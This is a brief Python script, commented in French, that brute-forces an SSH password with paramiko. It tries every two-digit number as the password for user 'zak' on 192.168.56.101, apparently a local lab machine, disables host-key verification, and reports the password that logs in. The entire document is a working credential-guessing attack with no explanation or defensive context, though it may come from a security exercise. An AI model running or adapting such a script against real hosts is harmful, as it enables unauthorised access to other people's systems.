import paramiko

def test_connexion(ip, user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=user, password=password, timeout=3)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"Erreur : {e}")
        return False

trouve=False
ip="192.168.56.101"
user="zak"
for chiffre1 in range(0,10):
    if trouve:
        break
    for chiffre2 in range(0,10):
        mot_de_passe=f"{chiffre1}{chiffre2}"
        print(f"Test:{mot_de_passe}")
        if test_connexion(ip,user,mot_de_passe):
            print(f"Trouvé: {mot_de_passe}")
            trouve= True
        if trouve==True:
            break